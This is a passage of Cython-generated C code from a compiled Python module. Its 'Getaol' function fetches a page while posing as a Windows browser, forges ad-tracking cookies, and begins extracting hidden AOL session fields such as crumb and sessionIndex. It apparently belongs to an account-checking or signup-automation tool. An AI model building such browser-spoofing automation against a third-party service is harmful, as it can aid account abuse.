                __pyx_t_7 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
                __PYX_ERR(0, 322, __pyx_L15_except_error)
              }
              __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              goto __pyx_L14_exception_handled;
            }
            __pyx_L15_except_error:;
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
            goto __pyx_L3_error;
            __pyx_L14_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
            __pyx_L18_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_13) {
              __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__33, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 322, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_16);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            }
            goto __pyx_L12;
          }
          __pyx_L12:;
        }
        goto __pyx_L22;
        __pyx_L9_error:;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L3_error;
        __pyx_L22:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_9) {
      __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_4, &__pyx_t_7) < 0) __PYX_ERR(0, 324, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_4);
      __pyx_v_e = __pyx_t_4;
      /*try:*/ {

        
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_e); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 325, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_tll); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 326, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 326, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L29;
        }
        __pyx_L28_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_17 = 0; __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_14, &__pyx_t_17, &__pyx_t_22);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_22);
          __pyx_t_9 = __pyx_lineno; __pyx_t_20 = __pyx_clineno; __pyx_t_21 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_17, __pyx_t_22);
          }
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ErrRestore(__pyx_t_13, __pyx_t_16, __pyx_t_15);
          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_17 = 0; __pyx_t_22 = 0;
          __pyx_lineno = __pyx_t_9; __pyx_clineno = __pyx_t_20; __pyx_filename = __pyx_t_21;
          goto __pyx_L5_except_error;
        }
        __pyx_L29:;
      }
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_n1);
  __Pyx_XDECREF(__pyx_v_n2);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_he3);
  __Pyx_XDECREF(__pyx_v_res1);
  __Pyx_XDECREF(__pyx_v_tok);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_f);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_2generator);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_5generator1);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_8generator2);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_15Getaol(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_15Getaol = {"Getaol", (PyCFunction)__pyx_pw_6source_15Getaol, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_15Getaol(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("Getaol (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_14Getaol(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_14Getaol(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_qq = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_tm1 = NULL;
  PyObject *__pyx_v_specData = NULL;
  PyObject *__pyx_v_specId = NULL;
  PyObject *__pyx_v_crumb = NULL;
  PyObject *__pyx_v_sessionIndex = NULL;
  PyObject *__pyx_v_acrumb = NULL;
  PyObject *__pyx_v_t = NULL;
  PyObject *__pyx_v_g = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  Py_ssize_t __pyx_t_8;
  Py_UCS4 __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_t_17;
  int __pyx_t_18;
  PyObject *__pyx_t_19 = NULL;
  int __pyx_t_20;
  char const *__pyx_t_21;
  PyObject *__pyx_t_22 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("Getaol", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 336, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 337, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6) < 0) __PYX_ERR(0, 337, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_en_q_0_9) < 0) __PYX_ERR(0, 337, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_headers, __pyx_t_6) < 0) __PYX_ERR(0, 336, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__34, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_qq = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 340, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_cookies = __pyx_t_6;
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyUnicode_Split(((PyObject*)__pyx_t_4), __pyx_kp_u__35, -1L); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt_List(__pyx_t_6, 0, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 341, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_tm1 = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_cookies, __pyx_n_s_update); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 342, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_gpp, __pyx_n_u_DBAA) < 0) __PYX_ERR(0, 343, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_gpp_sid, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 343, __pyx_L3_error)

      
      __pyx_t_7 = PyTuple_New(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 345, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_ID_c0M0fd00676f0ea1_T);
      __pyx_t_8 += 22;
      __Pyx_GIVEREF(__pyx_kp_u_ID_c0M0fd00676f0ea1_T);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_ID_c0M0fd00676f0ea1_T);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_tm1, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 345, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_RT);
      __pyx_t_8 += 4;
      __Pyx_GIVEREF(__pyx_kp_u_RT);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_RT);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_tm1, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 345, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_S_ALNI_MaEGaVTSG6nQFkSJ_RnxSZrF);
      __pyx_t_8 += 37;
      __Pyx_GIVEREF(__pyx_kp_u_S_ALNI_MaEGaVTSG6nQFkSJ_RnxSZrF);
      PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u_S_ALNI_MaEGaVTSG6nQFkSJ_RnxSZrF);
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_7, 5, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 345, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_gads, __pyx_t_10) < 0) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      
      __pyx_t_10 = PyTuple_New(5); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 346, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_UID_00000cf0e8904e94_T);
      __pyx_t_8 += 23;
      __Pyx_GIVEREF(__pyx_kp_u_UID_00000cf0e8904e94_T);
      PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_kp_u_UID_00000cf0e8904e94_T);
      __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_tm1, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 346, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_10, 1, __pyx_t_7);
      __pyx_t_7 = 0;
      __Pyx_INCREF(__pyx_kp_u_RT);
      __pyx_t_8 += 4;
      __Pyx_GIVEREF(__pyx_kp_u_RT);
      PyTuple_SET_ITEM(__pyx_t_10, 2, __pyx_kp_u_RT);
      __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_tm1, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 346, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_10, 3, __pyx_t_7);
      __pyx_t_7 = 0;
      __Pyx_INCREF(__pyx_kp_u_S_ALNI_MYCzPrYn9967HtpDSITUe5Z4);
      __pyx_t_8 += 37;
      __Pyx_GIVEREF(__pyx_kp_u_S_ALNI_MYCzPrYn9967HtpDSITUe5Z4);
      PyTuple_SET_ITEM(__pyx_t_10, 4, __pyx_kp_u_S_ALNI_MYCzPrYn9967HtpDSITUe5Z4);
      __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_10, 5, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 346, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_gpi, __pyx_t_7) < 0) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      
      __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 347, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = 0;
      __pyx_t_9 = 127;
      __Pyx_INCREF(__pyx_kp_u_t);
      __pyx_t_8 += 2;
      __Pyx_GIVEREF(__pyx_kp_u_t);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_t);
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_tm1, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 347, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
      __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_10);
      __pyx_t_10 = 0;
      __Pyx_INCREF(__pyx_kp_u_j_0_u_1);
      __pyx_t_8 += 11;
      __Pyx_GIVEREF(__pyx_kp_u_j_0_u_1);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_j_0_u_1);
      __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 347, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_cmp, __pyx_t_10) < 0) __PYX_ERR(0, 343, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_10, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_qq, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_split); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_5, __pyx_kp_u_name_attrSetIndex_input_type_hid) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_kp_u_name_attrSetIndex_input_type_hid);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_GetItemInt(__pyx_t_6, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 349, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 350, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
